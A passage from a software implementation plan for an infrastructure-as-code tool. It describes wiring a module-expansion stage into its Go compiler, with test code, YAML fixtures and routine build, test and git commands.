Everything stage 6 would have reported, including diagnostics that have nothing to do
with modules. A project with a module cycle AND a root-level `${nope.id}` referring to
no resource at all reports only the cycle. The user fixes the cycle, re-runs, and only
then learns about `nope`.

That is the same tension with spec §7.4 ("diagnostics collect, don't fail fast") that
stages 3 and 4 already resolve the same way, and for the same reason: after a failed
expansion the resource set stage 6 would walk is not the user's configuration. Every
reference into the failed module reports "no such resource", one per reference, and
that noise is proportional to the size of the module rather than to the size of the
mistake. One real diagnostic buried under twenty symptoms is worse than one real
diagnostic and a second run.

Step 8.6 is the test that this is what actually happens, and step 8.7 is the sabotage
that proves the test can fail.

### Files

| Action | Path |
|--------|------|
| modify | `internal/compiler/compile.go` |
| modify | `internal/compiler/resolved.go` (`Options` gains `Dir`) |
| modify | `internal/compiler/compile_test.go` |
| modify | `internal/cli/varopts.go` (`compilerOptions` sets `Dir`) |
| modify | `internal/compiler/bind.go` (stage 6 consumes an `Expansion`; `compileScope` deleted) |
| modify | `internal/compiler/bind_test.go` |
| modify | `internal/registry/registry.go` (the reserved `module.` prefix) |
| modify | `internal/registry/registry_test.go` |

`internal/cli/varopts.go`'s `compilerOptions` is the single choke point every
compiling command already goes through — `plan.go:48`, `apply.go:58` and
`validate.go:64` all call it and nothing else builds a `compiler.Options`. Confirm
that is still true before relying on it:

```bash
grep -rn "compiler.Options{" --include=*.go internal/ cmd/ | grep -v _test.go
```

If anything but `compilerOptions` constructs one in production code, that site needs
`Dir` too, and a `Dir` left empty means every relative module source resolves against
the process working directory instead of the project — which is wrong in exactly the
case `--chdir` exists for.

### Interfaces

**Consumes:**

```go
func modules.Expand(project *config.ProjectDecl, scope variables.Scope, dir string) (*config.ProjectDecl, diag.Diagnostics)  // Tasks 4-7
func environments.Resolve(decls []config.EnvironmentDecl, name string) (Chain, diag.Diagnostics)                              // M4, unchanged
func variables.Resolve(decls []config.VariableDecl, chain environments.Chain, files map[string]value.Value, cliVars map[string]string) (Scope, diag.Diagnostics)  // M4, unchanged
```

**Produces:**

```go
package compiler

// Options gains one field; the rest are unchanged.
type Options struct {
    Environment string
    Region      string
    Account     string
    Vars        map[string]string      // from --var
    FileVars    map[string]value.Value // from --var-file
    // Dir is the project directory. Stage 5 resolves each module's relative
    // `source:` against it. Compile does not read files itself — stage 1 ran
    // before it was called — but stage 5 does, and a module source is written
    // relative to the project, not to the process working directory.
    Dir string
}
```

Task 10's integration suite depends on `Dir` being fed from `--chdir`; nothing else
new is produced here.

### Steps

#### 8.1 A helper that keeps the project directory

`compile_test.go`'s `loadFiles` writes into a `t.TempDir()` and throws the path away.
Stage 5 needs it. Add beside `loadFiles` in `internal/compiler/compile_test.go`:

```go
// loadFilesInDir is loadFiles plus the directory the files were written into,
// and plus any extra files keyed by path relative to it. Stage 5 resolves a
// module's relative `source:` against that directory, so a compiler test that
// exercises modules cannot throw it away the way loadFiles does.
func loadFilesInDir(t *testing.T, body string, extra map[string]string) ([]config.File, string) {
	t.Helper()
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "infra.yml"), []byte(body), 0o644); err != nil {
		t.Fatalf("write infra.yml: %v", err)
	}
	for rel, content := range extra {
		full := filepath.Join(dir, rel)
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			t.Fatalf("MkdirAll %s: %v", filepath.Dir(full), err)
		}
		if err := os.WriteFile(full, []byte(content), 0o644); err != nil {
			t.Fatalf("write %s: %v", rel, err)
		}
	}
	files, err := config.Load(dir)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	return files, dir
}
```

#### 8.2 Failing test: stage 5 runs, and runs in the right place

Both tests in this step pin the POSITION of stage 5, not merely its presence. Each
fails in a different, specific way if stage 5 is inserted at the wrong boundary.

Add to `internal/compiler/compile_test.go`:

```go
// TestCompileExpandsAModuleAfterVariablesAreResolved pins stage 5's UPPER
// boundary. `${replicas}` inside the caller's `inputs:` block is a variable,
// and a variable is only in scope once stage 4 has run. Insert stage 5 above
// stage 4 and this fails with `undefined variable "replicas"` rather than with
// a wrong value — which is the failure worth having, because it names the
// boundary that moved.
func TestCompileExpandsAModuleAfterVariablesAreResolved(t *testing.T) {
	files, dir := loadFilesInDir(t, `
project: myapp
variables:
  replicas:
    type: integer
    default: 3
modules:
  - ./modules/app
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  web:
    type: module.app
    count: ${replicas}
`, map[string]string{
		"modules/app/module.yml": `
inputs:
  count:
    type: integer
resources:
  server:
    type: test.application
    image: nginx:1.27
    replicas: ${count}
`,
	})

	cfg, ds := Compile(files, testRegistry(t), Options{Environment: "dev", Dir: dir})
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}

	r, ok := cfg.Get(address.Address{Module: []string{"web"}, Name: "server"})
	if !ok {
		t.Fatalf("module.web.server is not in the resolved config; it holds %v", cfg.Addresses())
	}
	if n, _ := r.Attrs["replicas"].AsInt(); n != 3 {
		t.Errorf("replicas = %d, want 3 — a module input evaluated in the caller's scope must see the caller's variables", n)
	}
}

// TestCompileExpandsAModuleBeforeReferencesAreBound pins stage 5's LOWER
// boundary, and does it twice over.
//
// `${database.endpoint}` at the root is a reference to a MODULE OUTPUT
// (PLAN.md §11, contract Ruling 4). Stage 6 resolves it only if the module has
// already been instantiated. And `test.application` declares a Requirement for
// a `test.database` (providers/test/definitions.go), which stage 8 checks — so
// if expansion ran after binding, stage 8 would additionally report the
// application as missing its database. Both failures come from the same
// misplacement; asserting no diagnostics at all catches either.
func TestCompileExpandsAModuleBeforeReferencesAreBound(t *testing.T) {
	files, dir := loadFilesInDir(t, `
project: myapp
modules:
  - ./modules/db
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  database:
    type: module.db
    network: ${net.id}
  app:
    type: test.application
    image: nginx:1.27
    database_url: ${database.endpoint}
`, map[string]string{
		"modules/db/module.yml": `
inputs:
  network:
    type: string
resources:
  store:
    type: test.database
    engine: postgres
    network: ${network}
outputs:
  endpoint:
    value: ${store.endpoint}
`,
	})

	cfg, ds := Compile(files, testRegistry(t), Options{Environment: "dev", Dir: dir})
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}

	app, ok := cfg.Get(address.Address{Name: "app"})
	if !ok {
		t.Fatalf("the root application is missing; the config holds %v", cfg.Addresses())
	}
	url := app.Attrs["database_url"]
	if url.Known {
		t.Errorf("database_url = %#v, want an unknown: it reads a computed attribute of a resource that does not exist yet (contract Ruling 5)", url)
	}
	if _, ok := cfg.Get(address.Address{Module: []string{"database"}, Name: "store"}); !ok {
		t.Errorf("module.database.store is not in the resolved config; it holds %v — stage 8's requirement check reads this flat set (Ruling 7)", cfg.Addresses())
	}
}
```

`compile_test.go` will need `"github.com/infrata/infrata/pkg/address"` and, for
`loadFilesInDir`, `"os"` and `"path/filepath"` — check what it already imports rather
than assuming.

#### 8.3 Run it, see it fail

```bash
export PATH="$HOME/.local/share/mise/shims:$PATH"
go test -count=1 -run "TestCompileExpandsAModule" ./internal/compiler/
```

Expect a compile error on `Options{... Dir: dir}` (the field does not exist yet). Add
only the field, re-run, and expect `unrecognised top-level key "modules"` from stage 2
if Tasks 1-3 are not merged, or `module.web.server is not in the resolved config` if
they are. Both are the honest failure: nothing expands modules yet.

#### 8.4 Minimal code: the field and the stage

In `internal/compiler/resolved.go`, add `Dir` to `Options` with the doc comment given
under **Produces** above.

In `internal/compiler/compile.go`, insert between the stage-4 block and
`bindReferences`:

```go
	// Under the Expansion ruling this reads
	//     expansion, moduleDiags := modules.Expand(project, scope, opts.Dir)
	// and the bindReferences call below takes `expansion` instead. Nothing
	// else in this step changes. See the Expand note at the head of this plan.
	project, moduleDiags := modules.Expand(project, scope, opts.Dir)
	ds.Extend(moduleDiags)
	if moduleDiags.HasErrors() {
		// This halt suppresses ALL of stage 6, including diagnostics that
		// have nothing to do with modules: a root resource referring to a
		// nonexistent root resource is reported only on the next run. That
		// is deliberate and is the same trade stages 3 and 4 make. After a
		// failed expansion the resource set stage 6 would walk is not the
		// user's configuration — every reference into the module that failed
		// to expand reports "no such resource", one diagnostic per reference,
		// noise proportional to the size of the module rather than to the
		// size of the mistake. TestCompileStopsAfterModuleErrors pins the
		// suppression so it stays a decision rather than an accident.
		return ResolvedConfig{}, ds
	}

	cfg, bindDiags := bindReferences(project, scope, opts)
```

`Expand` returns a new `*config.ProjectDecl` and the assignment shadows nothing —
`project` is the same variable `config.Decode` produced, deliberately, so that no
later line in `Compile` can reach the unexpanded declarations by accident.

Extend `Compile`'s doc comment. It currently ends with the paragraph about stage 4;
add after it:

```go
// Stage 5 (modules.Expand) is the fourth such exception, and the last: it
// rewrites the DECLARATIONS, so like stages 3 and 4 it has no partial
// ResolvedConfig to hand forward and the zero value is all there is.
//
// Its halt is the broadest in this function, and the only one that suppresses
// diagnostics wholly unrelated to the stage that failed. A module cycle stops
// stage 6 from reporting a root-level reference to a nonexistent resource,
// even though the two have nothing to do with each other. The alternative is
// worse: after a failed expansion, every reference into the module that did
// not expand is a reference to a resource that is not there, so stage 6 would
// emit one "no such resource" per reference — the real diagnostic buried under
// symptoms of itself. TestCompileStopsAfterModuleErrors pins this, including
// its cost.
```

Add `"github.com/infrata/infrata/internal/modules"` to the imports.

In `internal/cli/varopts.go`, `compilerOptions` returns:

```go
	return compiler.Options{Environment: environment, Vars: vars, FileVars: fileVars, Dir: opts.Dir}, ds
```

with a line added to its doc comment:

```go
// Dir travels with the options because stage 5 resolves a module's relative
// `source:` against the project directory. Passing anything but opts.Dir here
// makes `--chdir` silently wrong for modules and right for everything else.
```

#### 8.5 Run it, see it pass

```bash
go test -count=1 ./internal/compiler/ ./internal/cli/
```

Both tests from 8.2 green. Commit:

```bash
git commit -m "M5 task 8: wire compiler stage 5 between variable resolution and binding" -- \
  internal/compiler/compile.go internal/compiler/resolved.go internal/compiler/compile_test.go internal/cli/varopts.go
```

#### 8.6 Failing test: what the halt suppresses

This is the step M4's stage-3 halt did not get. Add to
`internal/compiler/compile_test.go`:

```go
// TestCompileStopsAfterModuleErrors pins what the stage-5 halt costs.
//
// The fixture has TWO independent problems: a module cycle (stage 5) and a
// root resource referring to `nope`, which is neither a resource nor a module
// (stage 6). Only the first is reported. That is the halt doing its job, and
// asserting it here is what stops the halt from being quietly deleted by
// someone who reads §7.4 and concludes it contradicts "diagnostics collect".
//
// The assertion is deliberately two-sided. Counting diagnostics alone would
// pass if stage 5 emitted one diagnostic per cycle participant and stage 6
// never ran; asserting that "nope" appears NOWHERE is what proves the
// suppression rather than the arithmetic.
func TestCompileStopsAfterModuleErrors(t *testing.T) {
	files, dir := loadFilesInDir(t, `
project: myapp
modules:
  - ./modules/ping
resources:
  net:
    type: test.network
    cidr: ${nope.id}
  first:
    type: module.ping
`, map[string]string{
		"modules/ping/module.yml": `
modules:
  - ../pong
resources:
  next:
    type: module.pong
`,
		"modules/pong/module.yml": `
modules:
  - ../ping
resources:
  back:
    type: module.ping
`,
	})

	_, ds := Compile(files, testRegistry(t), Options{Environment: "dev", Dir: dir})
	if !ds.HasErrors() {
		t.Fatal("a module that transitively instantiates itself must be a diagnostic (contract Ruling 6)")
	}
	if len(ds) != 1 {
		t.Fatalf("want exactly the cycle diagnostic, got %d:\n%+v", len(ds), ds)
	}

	var rendered strings.Builder
	ds.Render(&rendered)
	if strings.Contains(rendered.String(), "nope") {
		t.Errorf("stage 6 ran after stage 5 failed:\n%s", rendered.String())
	}
}

// TestCompileWithoutModulesIsUnchanged is the other side of the boundary: a
// project with no `modules:` block at all must pass through stage 5 producing
// nothing — no diagnostic, no reordering, no change to any address. The whole
// M2/M3/M4 integration suite depends on this and would fail loudly, but it
// would fail as thirty unrelated tests rather than as one that says why.
func TestCompileWithoutModulesIsUnchanged(t *testing.T) {
	files, dir := loadFilesInDir(t, `
project: myapp
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  db:
    type: test.database
    engine: postgres
    network: ${net.id}
`, nil)

	cfg, ds := Compile(files, testRegistry(t), Options{Environment: "dev", Dir: dir})
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}
	got := cfg.Addresses()
	if len(got) != 2 || got[0].String() != "db" || got[1].String() != "net" {
		t.Errorf("addresses = %v, want [db net] at the root with no module path", got)
	}
	for _, a := range got {
		if len(a.Module) != 0 {
			t.Errorf("%s carries a module path in a project with no modules", a)
		}
	}
}
```

`compile_test.go` will need `"strings"` for the `Render` assertion.

#### 8.7 Run it, see it fail, then prove it can fail

```bash
go test -count=1 -run "TestCompileStopsAfterModuleErrors|TestCompileWithoutModulesIsUnchanged" ./internal/compiler/
```

`TestCompileWithoutModulesIsUnchanged` passes immediately — it is a characterisation
test and its job is to fail if something later overreaches.
`TestCompileStopsAfterModuleErrors` fails only if Tasks 4-7 do not yet detect cycles;
if so, report it against Tasks 4-7 and do not weaken the test.

Then **run the sabotage once and see the failure**, because a halt that no test can
distinguish from its absence is not pinned:

1. Delete the `if moduleDiags.HasErrors() { return ... }` block from `compile.go`.
2. `go test -count=1 -run TestCompileStopsAfterModuleErrors ./internal/compiler/`
3. It must fail, naming `nope`. If it still passes, the halt is not what this test
   thinks it is — stop and report that rather than restoring the block quietly.
4. Restore the block.

Commit:

```bash
git commit -m "M5 task 8: pin what the stage-5 halt suppresses" -- internal/compiler/compile_test.go
```

#### 8.8 Full verification

```bash
export PATH="$HOME/.local/share/mise/shims:$PATH"
go build ./cmd/infrata
go test -count=1 ./...
go vet ./...
gofmt -l .
grep -rn "compiler.Options{" --include=*.go internal/ cmd/ | grep -v _test.go   # only varopts.go
grep -rn "yaml\." --include=*.go internal/ pkg/ cmd/ | grep -v "^internal/config/"   # prints nothing
```

The last two must hold. The second is contract Ruling 2's one-command check: stage 5
calls `config.Load` and `config.Decode` and never handles a `yaml.Node`, and wiring it
into `Compile` must not have leaked one into `internal/compiler`.

#### 8.9a Failing test: a referenced attribute that does not exist

Amendment 11. This is a gap against the spec's own stage-6 row — "reject references to
nonexistent resources or attributes" — that has been live since M2, and it fails in the
worst available place. Verified against the binary with a control:

| command | today | should be |
|---------|-------|-----------|
| `validate` | `✓ Configuration valid`, exit 0 | a four-part diagnostic, exit 1 |
| `plan dev` | clean plan, `2 to create`, exit 2 | exit 1 |
| `apply dev` | **creates `store` for real**, then fails on `db` with `could not resolve deferred values: db: password is still unknown after its dependencies were applied` | nothing is created |

Three things make this worse than "silently unknown", and each shapes a test below:

1. **It is caught halfway through an apply, after real infrastructure exists** — not by
   `validate`, whose entire job is to catch it.
2. **The message names the symptom, not the cause.** It never says `test.network` has
   no `endpoint`.
3. **A phantom attribute is indistinguishable from a legitimate computed reference in
   the plan.** `network: ${store.id}` renders `(known after apply)` and so would the
   bad one, except that sensitivity renders it `<sensitive>`. **There is no plan output
   a user could read to catch this, so do not write a test that asserts on plan
   output** — there is nothing distinguishing to assert. The assertions below are on
   `validate`'s exit code and diagnostic, and on what `apply` did NOT create.

Add to `internal/compiler/compile_test.go`:

```go
// TestAReferenceToANonexistentAttributeIsReported is Amendment 11's general
// case. It is written against provider resources with no modules involved,
// deliberately: the check belongs to the compiler, not to module expansion,
// and 10.4b's module-output case extends it rather than paralleling it.
func TestAReferenceToANonexistentAttributeIsReported(t *testing.T) {
	files, dir := loadFilesInDir(t, `
project: myapp
resources:
  store:
    type: test.network
    cidr: 10.0.0.0/16
  db:
    type: test.database
    engine: postgres
    network: ${store.id}
    password: ${store.endpoint}
`, nil)

	_, ds := Compile(files, testRegistry(t), Options{Environment: "dev", Dir: dir})
	if !ds.HasErrors() {
		t.Fatal("test.network has no `endpoint`; a reference to one must be an error, not an unknown that surfaces mid-apply")
	}

	out := renderDiags(t, ds)
	// §44's four parts: what is wrong, on what, what was expected, what to do.
	requireContainsDiag(t, out, "endpoint")     // the attribute that does not exist
	requireContainsDiag(t, out, "test.network") // the type it does not exist on
	requireContainsDiag(t, out, "cidr")         // an attribute that DOES exist, from attributeNames(def)

	// The legitimate reference on the line above must not be reported. A check
	// that rejected every reference would satisfy every assertion so far.
	if strings.Count(out, "endpoint") != 1 {
		t.Errorf("expected exactly one diagnostic naming `endpoint`:\n%s", out)
	}
	if strings.Contains(out, "${store.id}") || strings.Contains(out, "has no attribute \"id\"") {
		t.Errorf("the legitimate ${store.id} reference was reported:\n%s", out)
	}
}

// TestAReferenceToAComputedAttributeIsStillFine is the boundary, and it is the
// one that stops this check from breaking the whole product. `id` and
// `endpoint` are COMPUTED (providers/test/definitions.go) — unknown at plan
// time and absent from configuration — and referencing one is the normal case
// that every dependency edge in every fixture depends on. Amendment 11 is about
// whether the NAME is real, never about whether the value is known.
func TestAReferenceToAComputedAttributeIsStillFine(t *testing.T) {
	files, dir := loadFilesInDir(t, `
project: myapp
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  db:
    type: test.database
    engine: postgres
    network: ${net.id}
  app:
    type: test.application
    image: nginx:1.27
    database_url: ${db.endpoint}
`, nil)

	if _, ds := Compile(files, testRegistry(t), Options{Environment: "dev", Dir: dir}); ds.HasErrors() {
		t.Fatalf("a reference to a computed attribute is the normal case and must compile: %+v", ds)
	}
}
```

`requireContainsDiag` is a two-line helper beside `renderDiags`; if
`compile_test.go` already has one, use it.

```go
func requireContainsDiag(t *testing.T, out, needle string) {
	t.Helper()
	if !strings.Contains(out, needle) {
		t.Errorf("diagnostics do not mention %q:\n%s", needle, out)
	}
}
```

**Check every asserted string against this fixture before running.** `endpoint`
appears once in the configuration (the bad reference) and is an attribute of
`test.database`, not of `test.network` — which is the point. `cidr` appears once as a
set attribute and is asserted because `attributeNames(def)` must list it. `test.network`
appears once as a type.

```bash
export PATH="$HOME/.local/share/mise/shims:$PATH"
go test -count=1 -run "TestAReferenceToANonexistent|TestAReferenceToAComputed" ./internal/compiler/
```

The first fails — `Compile` returns no diagnostics. The second passes already; its job
is to fail if 8.10 overreaches, which is the likelier way this goes wrong.

#### 8.9 Failing test: two modules each declaring a `db`

This is Ruling 1's landmine at the one place it can still bite after Amendment 7 —
stage 6. Add to `internal/compiler/compile_test.go`:

```go
// TestTwoModulesEachDeclaringADbResolveTheirOwn is the whole reason a Reference
// carries an address.
//
// Both modules declare a resource named `db` and an application referring to
// `${db.engine}`. Those two `${db.engine}` expressions are textually identical
// and are parsed from identical source. If stage 6 evaluates a reference by
// bare name, one of them resolves to the other module's database — not an
// error, just the wrong resource, which is a silently wrong plan.
//
// The check is the dependency edge, because that is what a reference PRODUCES
// and it is recorded per resolved resource. A value comparison could not do
// it: the compile-time scope reports every resource attribute as unavailable,
// so both spellings evaluate to the same unknown.
func TestTwoModulesEachDeclaringADbResolveTheirOwn(t *testing.T) {
	const appModule = `
inputs:
  network:
    type: string
  engine:
    type: string
resources:
  db:
    type: test.database
    engine: ${engine}
    network: ${network}
  server:
    type: test.application
    image: nginx:1.27
    database_url: ${db.engine}
`
	files, dir := loadFilesInDir(t, `
project: myapp
modules:
  - ./modules/app
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  left:
    type: module.app
    network: ${net.id}
    engine: postgres
  right:
    type: module.app
    network: ${net.id}
    engine: mysql
`, map[string]string{"modules/app/module.yml": appModule})

	cfg, ds := Compile(files, testRegistry(t), Options{Environment: "dev", Dir: dir})
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}

	for _, side := range []string{"left", "right"} {
		server, ok := cfg.Get(address.Address{Module: []string{side}, Name: "server"})
		if !ok {
			t.Fatalf("module.%s.server is missing; the config holds %v", side, cfg.Addresses())
		}
		want := "module." + side + ".db"
		var got []string
		for _, dep := range server.DependsOn {
			got = append(got, dep.String())
		}
		if len(got) != 1 || got[0] != want {
			t.Errorf("module.%s.server depends on %v, want exactly [%s] — a reference resolved by bare "+
				"name binds to whichever `db` the implementation happened to see first, and the plan is "+
				"then wrong rather than invalid", side, got, want)
		}
	}
}
```

**Check before running:** `resource.ResolvedResource.DependsOn` is `[]address.Address`
built from the edge map (`internal/compiler/bind.go`). Confirm the field name and that
it is sorted, with `grep -n "DependsOn" internal/compiler/bind.go`.

```bash
export PATH="$HOME/.local/share/mise/shims:$PATH"
go test -count=1 -run TestTwoModulesEachDeclaringADb ./internal/compiler/
```

Against the pre-Amendment-7 `bindReferences` this fails with `DependsOn` holding a
bare `db`, or with the two servers depending on the same resource.

#### 8.9b Failing test: an unbound name names BOTH possibilities

Ruling 4, and it is now implemented at exactly one site: `bindAttribute`'s default arm.
`modules.Scope.Qualify` returns a single `*value.Expr` and emits no diagnostics
(Amendment 13c), leaving a reference it could not resolve byte-identical for this
function to report. **Tasks 4-7's tests pin the data — that the candidate list is
correct and sorted — not the wording.** If this test is not written, the wording is
tested by nobody, and "no such resource" would satisfy every other test in the suite.

Add to `internal/compiler/compile_test.go`:

```go
// TestAnUnboundNameNamesBothPossibilities is Ruling 4's wording. A bare name in
// ${name.attr} could have been meant as a resource or as a module call, and the
// compiler cannot know which — so a user who mistypes a module call's name and
// is told only that no RESOURCE of that name exists will go looking in the
// wrong file for a thing that is not missing.
func TestAnUnboundNameNamesBothPossibilities(t *testing.T) {
	files, dir := loadFilesInDir(t, `
project: myapp
modules:
  - ./modules/db
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  thedb:
    type: module.db
    network: ${net.id}
  app:
    type: test.application
    image: nginx:1.27
    database_url: ${nowhere.endpoint}
`, map[string]string{"modules/db/module.yml": dbModuleYAML})

	_, ds := Compile(files, testRegistry(t), Options{Environment: "dev", Dir: dir})
	if !ds.HasErrors() {
		t.Fatal("`nowhere` is neither a resource nor a module call and must be reported")
	}
	out := renderDiags(t, ds)

	requireContainsDiag(t, out, "nowhere") // the name as typed
	requireContainsDiag(t, out, "module")  // Ruling 4: BOTH possibilities, not just "resource"
	requireContainsDiag(t, out, "thedb")   // the module call IS in scope and must be offered
	requireContainsDiag(t, out, "net")     // so is the provider resource

	// The negative that carries the ruling. "no such resource" alone is the
	// failure Ruling 4 exists to prevent, and it reads perfectly well — which
	// is why only an explicit assertion catches it.
	if strings.Contains(out, "undeclared resource") && !strings.Contains(out, "or module") {
		t.Errorf("the diagnostic names only the resource possibility:\n%s", out)
	}
}

// TestAMisspelledModuleOutputIsDistinguishedFromAnUnboundName is the other half
// of the same arm. `thedb` IS a module call; `vpc_id` is not one of its
// outputs. That must not produce "no resource or module named thedb", which
// would be false — the call is right there in the file the user is reading.
func TestAMisspelledModuleOutputIsDistinguishedFromAnUnboundName(t *testing.T) {
	files, dir := loadFilesInDir(t, `
project: myapp
modules:
  - ./modules/db
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  thedb:
    type: module.db
    network: ${net.id}
  app:
    type: test.application
    image: nginx:1.27
    database_url: ${thedb.vpc_id}
`, map[string]string{"modules/db/module.yml": dbModuleYAML})

	_, ds := Compile(files, testRegistry(t), Options{Environment: "dev", Dir: dir})
	if !ds.HasErrors() {
		t.Fatal("`vpc_id` is not an output of the db module and must be reported")
	}
	out := renderDiags(t, ds)

	requireContainsDiag(t, out, "vpc_id")   // the output that does not exist
	requireContainsDiag(t, out, "thedb")    // the call it was asked of
	requireContainsDiag(t, out, "endpoint") // the output that DOES exist, per §44

	if strings.Contains(out, "no resource or module named") {
		t.Errorf("a real module call with a misspelled output was reported as an unbound name:\n%s", out)
	}
}
```

`dbModuleYAML` is the module source these two share; declare it once at the top of the
test file, matching Task 10's `dbModule`:

```go
const dbModuleYAML = `
inputs:
  network:
    type: string
  size:
    type: integer
    default: 7
resources:
  store:
    type: test.database
    engine: postgres
    network: ${network}
    size: ${size}
outputs:
  endpoint:
    value: ${store.endpoint}
`
```

**Check every asserted string against the fixture.** `nowhere` and `vpc_id` each appear
exactly once, in the bad reference. `endpoint` appears in the module's `outputs:` block
and as `test.database`'s computed attribute — it is asserted in the SECOND test only,
where the candidate list is what must contain it. `module` appears in `modules:` and in
`type: module.db`, so that assertion is weak on its own; the negative assertion beneath
it is what actually carries Ruling 4.

```bash
export PATH="$HOME/.local/share/mise/shims:$PATH"
go test -count=1 -run "TestAnUnboundNameNamesBoth|TestAMisspelledModuleOutput" ./internal/compiler/
```

Both fail today: the first with `reference to undeclared resource`, which names one
possibility; the second the same way, misattributing a real call.

#### 8.10 Minimal code: stage 6 consumes an `Expansion`, and `compileScope` is deleted

Four edits in `internal/compiler/bind.go`, all located by grep rather than line number:

```bash
grep -n "compileScope" internal/compiler/*.go        # the type, its two methods, two uses
grep -n "func bindReferences" -A 20 internal/compiler/bind.go
grep -n "declared\[" internal/compiler/bind.go       # the bare-name membership set
```

1. **Delete `compileScope` entirely** — the type at `bind.go:27` and both methods. It
   is superseded, not supplemented. `*modules.Scope` answers the same two questions
   (`Variable`, `Attribute`) and already satisfies `expressions.Scope`; keeping both
   would mean two implementations of "what is in scope here", which is the shape that
   leaked a plaintext secret in M2 when a fix reached one copy and not the other.
   `grep -rn "compileScope" --include=*.go .` must print nothing when this task ends.

2. **`bindReferences` takes the expansion AND the registry**, and iterates instances
   rather than `project.Resources`. Amendment 11's attribute check lands here rather
   than in a step of its own for one reason: it needs the same twelve lines. `declared`
   stops being `map[string]bool` and starts carrying what a reference can be checked
   against, and rewriting that map twice — once for addressing, once for attributes —
   would put the second change on code the first had already moved.

   `Compile` already holds `reg` (`compile.go:76`); `bindReferences` simply does not
   take it today (`bind.go:43`). Pass it:

```go
func bindReferences(expansion modules.Expansion, opts Options) (ResolvedConfig, diag.Diagnostics) {
	var ds diag.Diagnostics

	out := ResolvedConfig{
		Project:     expansion.Project,
		Environment: opts.Environment,
		Resources:   make(map[string]*resource.ResolvedResource, len(expansion.Instances)),
	}

	// Membership is keyed by canonical ADDRESS now, not by bare name. Before
	// expansion the two coincided; after it, `db` is ambiguous across modules
	// and `module.left.db` is not.
	//
	// This key is only safe because a USER-WRITTEN reference can never spell
	// it. parseReference (internal/expressions/parse.go:234) splits on `.` and
	// joins all but the last segment, so `${module.prod.database.id}` would
	// parse to target `module.prod.database` — exactly a key in this map — and
	// a module's internals would become reachable from the calling file.
	// Task 1 rejects a `module.` segment at PARSE time, where "qualified by
	// Qualify" and "typed by the user" are trivially distinguishable because
	// Qualify has not run; in here they are the same bytes. Amendment 14a.
	// PLAN.md §11.2: a module exposes outputs, not resources.
	//
	// And it carries the TARGET rather than a bool, because a reference has
	// two axes and only one of them was ever checked: that the resource exists
	// (checked since M1) and that the attribute exists on it (Amendment 11,
	// unchecked since M2 and the reason an `infrata apply` could create real
	// infrastructure and then fail on a typo).
	declared := make(map[string]refTarget, len(expansion.Instances))
	for _, inst := range expansion.Instances {
		declared[inst.Address.String()] = targetFor(inst, reg)
	}

	for _, inst := range expansion.Instances {
		resolved := &resource.ResolvedResource{
			Address:   inst.Address,
			Type:      inst.Decl.Type,
			Attrs:     make(map[string]value.Value, len(inst.Decl.Attributes)),
			Lifecycle: resource.Lifecycle{PreventDestroy: inst.Decl.Lifecycle.PreventDestroy, Retain: inst.Decl.Lifecycle.Retain},
			Origin:    inst.Decl.Origin,
		}
		...
			resolved.Attrs[name] = bindAttribute(inst, attr, declared, edges, &ds)
```

   with `refTarget` and `targetFor` added beside them:

```go
// refTarget is what a reference can be checked against: the target's type, for
// the message, and the attribute names it legitimately offers.
//
// Every entry describes a PROVIDER resource, and that is not an oversight.
// Expansion.Instances holds the flattened result, so a module CALL — a
// resource of type module.<name> — has been expanded away before
// bindReferences runs and can never appear here. Module OUTPUTS are checked
// somewhere else entirely, by modules.Scope.Qualify, and cannot be checked
// here: Qualify FOLDS an output reference into an OpLiteral, so by the time
// e.References() is read below there is no module-output reference left to
// see. See the note in 10.4b — that split is structural, not a choice.
type refTarget struct {
	typeName string   // "test.network", or "module.db" for an instance
	names    []string // sorted attribute names of a provider resource
}

func (t refTarget) has(name string) bool {
	for _, n := range t.names {
		if n == name {
			return true
		}
	}
	return false
}

// targetFor describes one instance. The registry answers for a provider
// resource; an unregistered type yields a target with no names, and the
// reference check SKIPS it — stage 7 reports the unknown type itself
// (schema.go:27) and reporting every reference to it as well would bury that
// one diagnostic under one per reference.
func targetFor(inst modules.Instance, reg *registry.Registry) refTarget {
	def, ok := reg.Definition(inst.Decl.Type)
	if !ok {
		return refTarget{typeName: inst.Decl.Type}
	}
	return refTarget{typeName: def.Type, names: attributeNames(def)}
}
```

   `attributeNames(def)` is `schema.go:310`, already in this package and already the
   list `checkConfiguredAttributes` prints at `schema.go:64` for the
   attributes-a-resource-SETS case. One implementation, two callers — do not write a
   second.

   `Expansion.Project` is the project name, which `bindReferences` reads from
   `project.Project` today. If Tasks 4-7's `Expansion` does not carry it, pass it
   alongside rather than reaching back to the `ProjectDecl` — `Compile` has both.

3. **`bindAttribute` qualifies before it evaluates.** The order is
   parse → qualify → evaluate, and the qualified tree is what gets STORED:

```go
	e, parseDiags := expressions.Parse(src, attr.Origin)
	ds.Extend(parseDiags)
	if parseDiags.HasErrors() {
		return value.Unknown(attr.Value.Kind, value.SourceComputed).WithOrigin(attr.Origin)
	}

	// Qualify before anything reads a reference out of the tree. A reference
	// is parsed SCOPE-RELATIVE — an empty module path means "in whichever
	// scope this expression was written" — and Qualify makes it absolute
	// against this instance's scope. It returns the qualified tree, and that
	// tree is what the loop below reads, what Evaluate sees, and what the
	// unknown carries forward into the plan and the executor.
	//
	// Re-rooting what References() yields instead would not work: it returns
	// COPIES (`out = append(out, n.Ref)` in pkg/value/expr.go), so the stored
	// tree would stay scope-relative while the diagnostics looked correct —
	// right message, wrong resource at apply.
	e = inst.Scope.Qualify(e)

	for _, ref := range e.References() {
		target, known := declared[ref.Target.String()]
		switch {
		case !known:
			...  // unchanged: reference to undeclared resource
		case ref.Target == inst.Address:
			...  // unchanged: refers to itself
